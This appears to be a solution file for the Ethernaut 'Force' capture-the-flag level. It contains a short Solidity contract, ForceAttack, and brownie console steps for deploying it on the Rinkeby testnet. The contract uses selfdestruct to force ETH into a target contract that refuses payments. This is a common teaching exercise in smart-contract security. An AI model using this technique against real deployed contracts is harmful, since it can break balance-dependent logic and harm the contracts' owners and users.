/* 

Note : selfdestrcut(address) can forcibly send eth to a contract 


# Open brownie console with rinkeby testnet

brownie console --network rinkeby

# import your account using mnemonic

accounts.from_mnemonic("your account mnemonic")

# deploy the attack contract 

ForceAttack.deploy({'from':a[0]})

# send eth to the attack contract

accounts[0].transfer(ForceAttack[0].address,amount='.00001 ether')

# call destroy  with address of the Force contract

ForceAttack[0].destroy("ForceContractAddress",{'from': a[0]})

# submit instance

*/

//SPDX-License-Identifier: MIT

pragma solidity 0.8.6;

contract ForceAttack {

// reviece functiuon, to send eth to the attack contract
receive() external payable {

}

//when called it will forcibly send eth to the Force Contract
function destroy(address payable _ForceAddress) external {

    selfdestruct(_ForceAddress);
    
    }
}